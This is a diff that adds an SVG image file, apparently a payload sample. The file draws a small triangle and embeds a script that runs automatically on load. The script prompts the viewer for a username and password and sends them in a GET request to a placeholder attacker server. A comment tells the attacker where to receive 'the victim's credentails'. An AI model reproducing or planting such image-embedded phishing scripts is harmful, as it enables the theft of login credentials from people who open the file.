@@ -1,0 +1,31 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/ecmascript"><![CDATA[
+       function login() {
+            var username = prompt("Please enter your username:");
+            var password = prompt("Please enter your password:");
+            
+            // Enter you server address where you want to receive the victim's credentails.
+            var url = 'https://remote_server_address/login?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+
+            fetch(url, {
+                method: 'GET',
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Login successful!");
+                } else {
+                    alert("Login failed. Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        login();
+   ]]></script>
+</svg>
